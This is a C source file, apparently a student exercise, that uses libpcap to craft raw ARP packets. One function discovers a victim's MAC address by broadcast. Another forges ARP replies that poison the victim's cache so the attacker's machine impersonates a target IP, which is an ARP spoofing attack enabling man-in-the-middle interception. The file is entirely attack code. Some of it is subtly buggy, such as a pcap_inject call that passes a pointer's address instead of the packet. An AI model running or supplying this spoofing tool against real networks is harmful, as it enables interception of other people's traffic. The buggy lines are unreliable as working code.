#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <pcap.h>
#include <pcap/pcap.h>
#include <net/if.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <ifaddrs.h>
#include <unistd.h>
#include <pthread.h>
#include "send_arp.h"

#pragma pack(push, 1)
struct ARP_PACKET{
    struct ethernet_header eth_h;
    struct arp_header arp_h;
    struct arp_payload arp_p;
};

struct info{
    char dev[10];
    uint8_t sender_ip[4];
    uint8_t target_ip[4];
};
#pragma pack(pop)

void local_info_setting(char *dev, uint8_t *ipstr, uint8_t *macstr){
    ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);

    ioctl(s, SIOCGIFHWADDR, &ifr);
    memcpy((char *)macstr, ifr.ifr_hwaddr.sa_data, 6);

    ioctl(s, SIOCGIFADDR, &ifr);
    memcpy((char *)ipstr, ifr.ifr_addr.sa_data+2, 4);
    close(s);
}

void ip_change(char * ip, uint8_t * unchanged_ip){
    char * a = strtok(ip, ".");
    char * b = strtok(NULL, ".");
    char * c = strtok(NULL, ".");
    char * d = strtok(NULL, ".");
    unchanged_ip[0] = (uint8_t)atoi(a);
    unchanged_ip[1] = (uint8_t)atoi(b);
    unchanged_ip[2] = (uint8_t)atoi(c);
    unchanged_ip[3] = (uint8_t)atoi(d);
}

void makeARP_header(struct arp_header *arph, uint16_t opcode){
    arph->arp_hw_type = htons(0x0001); //define type of net, ethernet is 0x0001
    arph->arp_protocol = htons(0x0800); //IPv4 is 0x0800
    arph->arp_hw_size = 0x6; // length of mac is 6
    arph->arp_protocol_size = 0x4; // length of ip is 4;
    arph->arp_opcode =htons(opcode); //ARP_request == 0x0001, ARP_reply ==0x0002
}

struct ethernet_header etherH;
struct arp_header arpH;
struct arp_payload arpPayload;
struct ARP_PACKET arpPacket;

void Get_senderMAC(char* dev, uint8_t* senderIP, uint8_t* senderMAC){
    //make broadcast packet & get sender's MAC
    uint8_t localMAC[6];
    uint8_t localIP[4];
    struct arp_header arpH;
    local_info_setting(dev, localIP, localMAC);
    char errbuf[1000];
    u_char flush[42];
    memset(&flush[0], 0xFF, 6); //Boradcast Setting
    memcpy(&flush[6], localMAC, 6);
    //memset(&flush[12], 0x0806 ,2);                //ARP Protocol ID
    memcpy(&flush[12], "\x08\x06", 2);
    makeARP_header(&arpH, ARPOP_REQUEST);         //opcode = 0x01
    memcpy(&flush[14], &arpH, sizeof(arpH));
    memcpy(&flush[22], localMAC, 6);
    memcpy(&flush[28], localIP, 4);
    memset(&flush[32], 0x00, 6);
    memcpy(&flush[38], senderIP, 4);
    pcap_t* handle = pcap_open_live(dev, 1000, 1, 1, errbuf);
    struct ARP_PACKET *arp_packet;
    arp_packet = (struct ARP_PACKET*)flush;
    pcap_inject(handle, (char*)&arp_packet, sizeof(struct ARP_PACKET));
    //I have to check packet!
    struct pcap_pkthdr* header;
    const u_char* packet;
    while (true) {
        int res = pcap_next_ex(handle, &header, &packet);
        arp_packet = (struct ARP_PACKET*)packet;
        if(memcmp(arp_packet->arp_p.sender_ip, senderIP, 4) == 0 )
            break;
        pcap_inject(handle, (u_char*)flush, sizeof(flush));
    }
    memcpy(senderMAC, arp_packet->eth_h.ether_shost, 6); //we get senderMAC!!
}

void inject_ARP_sender(char* dev, uint8_t* senderIP ,uint8_t* targetIP, uint8_t* senderMAC){
    //chear sender that attacker is target!
    uint8_t localMAC[6];
    uint8_t localIP[4];
    char errbuf[1000];
    local_info_setting(dev, localIP, localMAC);
    u_char flush[42];
    struct arp_header arpH;
    memcpy(&flush[0], senderMAC, 6);
    memcpy(&flush[6], localMAC, 6);
    memcpy(&flush[12], "\x08\x06" ,2);
    makeARP_header(&arpH, ARPOP_REPLY);
    memcpy(&flush[14], &arpH, sizeof(arpH));
    memcpy(&flush[22], localMAC, 6);
    memcpy(&flush[28], targetIP, 4); //cheat sender using target ip!
    memcpy(&flush[32], senderMAC, 6);
    memcpy(&flush[38], senderIP, 4);
    for (int i = 0; i < sizeof(flush); i++){
        printf("%02X ", flush[i]);
    }
    pcap_t* handle = pcap_open_live(dev, 1000, 1, 1, errbuf);
    pcap_inject(handle, (u_char*)flush, sizeof (flush));
}
